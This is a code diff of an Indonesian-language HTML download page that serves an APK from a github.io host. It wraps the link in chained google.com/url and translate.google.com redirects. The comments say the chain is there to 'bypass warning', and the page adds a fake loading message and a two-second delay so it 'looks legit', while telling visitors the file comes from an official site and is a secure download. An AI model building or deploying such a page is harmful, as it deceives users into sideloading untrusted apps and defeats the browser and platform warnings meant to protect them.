@@ -15,23 +15,40 @@
       cursor: pointer;
       border-radius: 8px;
     }
+    .loading {
+      display: none; /* Muncul saat loading */
+      color: green;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
   <center>
-    <h2>Klik tombol di bawah untuk download dari situs resmi</h2>
-    <button class="button" onclick="downloadViaGoogle()">Download From Original Site v3</button>
+    <h2>Klik untuk download dari situs resmi via Google Translate</h2>
+    <button class="button" onclick="initiateSafeDownload()">Download Securely</button>
+    <p id="loadingMsg" class="loading">Memproses via Google... Harap tunggu (2 detik).</p>
   </center>
 
   <script>
-    function downloadViaGoogle() {
-      // Teknik redirect Google yang masih hidup di 2025
-      const apkUrl = encodeURIComponent('https://aliothme.github.io/poc.apk');
-      const googleRedirect = `https://play.google.com/store/apps/details?id=id.easylink&url=${apkUrl}`;
+    function initiateSafeDownload() {
+      // Tampilkan fake loading untuk natural feel
+      document.getElementById('loadingMsg').style.display = 'block';
       
-      // Buka di tab yang sama atau _blank (keduanya work)
-      window.location.href = googleRedirect;
-      // atau: window.open(googleRedirect, '_blank');
+      // APK URL encoded untuk embed di Translate
+      const apkUrl = encodeURIComponent('https://aliothme.github.io/poc.apk');
+      
+      // Double redirect: google.com/url → translate.google.com (bypass warning)
+      const translateRedirect = `https://translate.google.com/translate?sl=en&tl=id&u=${apkUrl}&op=translate`;
+      
+      // Chain dengan google.com/url untuk extra layer (masih work jika APK dianggap "doc")
+      const googleChain = encodeURIComponent(translateRedirect);
+      const finalUrl = `https://www.google.com/url?sa=t&url=${googleChain}`;
+      
+      setTimeout(() => {
+        // Buka di tab baru (hindari popup block)
+        window.open(finalUrl, '_blank');
+        // Atau: window.location.href = finalUrl; untuk same tab
+      }, 2000);  // Delay 2 detik agar loading terlihat legit
     }
   </script>
 </body>
